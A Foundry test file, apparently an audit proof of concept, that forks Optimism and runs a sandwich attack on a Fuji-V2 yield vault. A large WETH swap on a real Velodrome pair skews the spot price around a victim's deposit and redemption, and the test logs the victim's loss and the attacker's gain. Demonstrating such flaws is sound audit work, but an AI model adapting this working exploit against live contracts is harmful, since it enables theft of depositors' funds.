// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "forge-std/console.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol";
import {TimelockController} from
  "openzeppelin-contracts/contracts/governance/TimelockController.sol";
import {YieldVault} from "../../src/vaults/yield/YieldVault.sol";
import {BeefyVelodromesETHETHOptimism} from
  "../../src/providers/optimism/BeefyVelodromesETHETHOptimism.sol";
import {IWETH9} from "../../src/helpers/PeripheryPayments.sol";
import {IVault} from "../../src/interfaces/IVault.sol";
import {ILendingProvider} from "../../src/interfaces/ILendingProvider.sol";
import {Chief} from "../../src/Chief.sol";
import {CoreRoles} from "../../src/access/CoreRoles.sol";
import {DSTestPlus} from "../utils/DSTestPlus.sol";

import {IVelodromePair} from "../../src/interfaces/velodrome/IVelodromePair.sol";
import {IBeefyUniV2ZapVelodrome} from "../../src/interfaces/beefy/IBeefyUniV2ZapVelodrome.sol";
import {BaseVault} from "../../src/abstracts/BaseVault.sol";
import {IBeefyVaultV6} from "../../src/interfaces/beefy/IBeefyVaultV6.sol";


contract OracleManipulation is DSTestPlus, CoreRoles {
  address alice = address(0xA);
  address bob = address(0xB);
  address cecile = address(0xC);

  uint256 optimismFork;

  IVault public vault;
  IWETH9 public weth;
  Chief public chief;
  TimelockController public timelock;

  function setUp() public {
    optimismFork = vm.createSelectFork("optimism");

    vm.label(address(alice), "alice");
    vm.label(address(bob), "bob");
    vm.label(0xa132DAB612dB5cB9fC9Ac426A0Cc215A3423F9c9, "UniswapV2Solidly");
    vm.label(0xf92129fE0923d766C2540796d4eA31Ff9FF65522, "BeefyVault");

    weth = IWETH9(0x4200000000000000000000000000000000000006);

    address[] memory admins = new address[](1);
    admins[0] = address(this);
    timelock = new TimelockController(1 days, admins, admins);

    chief = new Chief();
    chief.setTimelock(address(timelock));

    vault =
      new YieldVault(address(weth), address(chief), "Fuji-V2 WETH YieldVault Shares", "fyvWETH");
    ILendingProvider beefy = new BeefyVelodromesETHETHOptimism();
    ILendingProvider[] memory providers = new ILendingProvider[](1);
    providers[0] = beefy;
    _utils_setupVaultProvider(vault, providers);
    vault.setActiveProvider(beefy);
  }

  function _utils_setupTestRoles() internal {
    // Grant this test address all roles.
    chief.grantRole(REBALANCER_ROLE, address(this));
    chief.grantRole(LIQUIDATOR_ROLE, address(this));
  }

  function _utils_callWithTimelock(bytes memory sendData, IVault vault_) internal {
    timelock.schedule(address(vault_), 0, sendData, 0x00, 0x00, 1.5 days);
    vm.warp(block.timestamp + 2 days);
    timelock.execute(address(vault_), 0, sendData, 0x00, 0x00);
    rewind(2 days);
  }

  function _utils_setupVaultProvider(IVault vault_, ILendingProvider[] memory providers_) internal {
    _utils_setupTestRoles();
    bytes memory sendData = abi.encodeWithSelector(IVault.setProviders.selector, providers_);
    _utils_callWithTimelock(sendData, vault_);
  }

  function test_oracle_manipulation() public{
    uint256 amount = 5000 ether;
    uint256 bob_amount = 50 ether;
    
    deal(address(weth), alice, amount);
    deal(address(weth), bob, bob_amount);

    IBeefyUniV2ZapVelodrome beefyZap = IBeefyUniV2ZapVelodrome(0x9b50B06B81f033ca86D70F0a44F30BD7E0155737);
    
    IBeefyVaultV6 beefyVault = IBeefyVaultV6(0xf92129fE0923d766C2540796d4eA31Ff9FF65522);
    IVelodromePair pair = IVelodromePair(beefyVault.want());

    uint256 reserveA;
    uint256 reserveB;
    uint256 blockTimestampLast;
    IERC20 token1 = IERC20(pair.token1());

    bool do_sandwich_attack = true;
   
   // BEFORE

    (reserveA, reserveB, blockTimestampLast) = pair.getReserves();

    console.log("CURRENT STATE:");
    console.log("Reserves:", reserveA, reserveB);
    console.log("Spot price:", reserveA * 100 / reserveB);
    console.log("AliceWETH", weth.balanceOf(alice));
    console.log("Alicetoken", token1.balanceOf(alice));
    console.log("shares bob", vault.balanceOf(bob));
    console.log("wether bob", weth.balanceOf(bob));
    uint256 bob_begin = weth.balanceOf(bob);
    uint256 alice_begin = weth.balanceOf(alice);
    console.log("---");

    // SANDWICH - PRE - MANIPULATE PRICE
    if (do_sandwich_attack) {
      vm.startPrank(alice);
      uint256 amountOut0 = pair.getAmountOut(weth.balanceOf(alice), address(weth));
      
      weth.transfer(address(pair), weth.balanceOf(alice));
      pair.swap(0, amountOut0, alice, "");

      
      (reserveA, reserveB, blockTimestampLast) = pair.getReserves();

      console.log("AFTER PRE SANDWICH:");
      console.log("Reserves:", reserveA, reserveB);
      console.log("Spot price:", reserveA * 100 / reserveB);
      console.log("AliceWETH", weth.balanceOf(alice));
      console.log("Alicetoken", token1.balanceOf(alice));
      console.log("---");
      vm.stopPrank();
    }

    // BOB DEPOSITS

    vm.startPrank(bob);
    SafeERC20.safeApprove(IERC20(address(weth)), address(vault), bob_amount);
    vault.deposit(bob_amount, bob);
    console.log("AFTER DEPOSIT:");
    console.log("shares bob", vault.balanceOf(bob));
    console.log("wether bob", weth.balanceOf(bob));
    console.log("---");
    vm.stopPrank();


    // SANDWICH - POST - BRING BACK PRICE
    if (do_sandwich_attack) {
      vm.startPrank(alice);

      uint256 amountOut1 = pair.getAmountOut(token1.balanceOf(alice), address(token1));
      
      token1.transfer(address(pair), token1.balanceOf(alice));
      pair.swap(amountOut1, 0, alice, "");

      (reserveA, reserveB, blockTimestampLast) = pair.getReserves();

      console.log("AFTER POST SANDWICH:");
      console.log("Reserves:", reserveA, reserveB);
      console.log("Spot price:", reserveA * 100 / reserveB);
      console.log("AliceWETH", weth.balanceOf(alice));
      console.log("Alicetoken", token1.balanceOf(alice));
      console.log("---");

      vm.stopPrank();
    }

   // BOB REDEMS

    vm.startPrank(bob);
    vault.redeem(vault.balanceOf(bob), bob, bob);
    vm.stopPrank();
    
    console.log("AFTER REDEEM:");
    console.log("shares bob", vault.balanceOf(bob));
    console.log("wether bob", weth.balanceOf(bob));
    console.log("AliceWETH", weth.balanceOf(alice));
    console.log("---");
    uint256 bob_end = weth.balanceOf(bob);
    uint256 alice_end = weth.balanceOf(alice);
    
    console.log("BOB LOST: approx.", (bob_begin-bob_end)/10**18, "ETH");
    console.log("ALICE GAIN: approx.", (alice_end-alice_begin)/10**18, "ETH");
  }
}
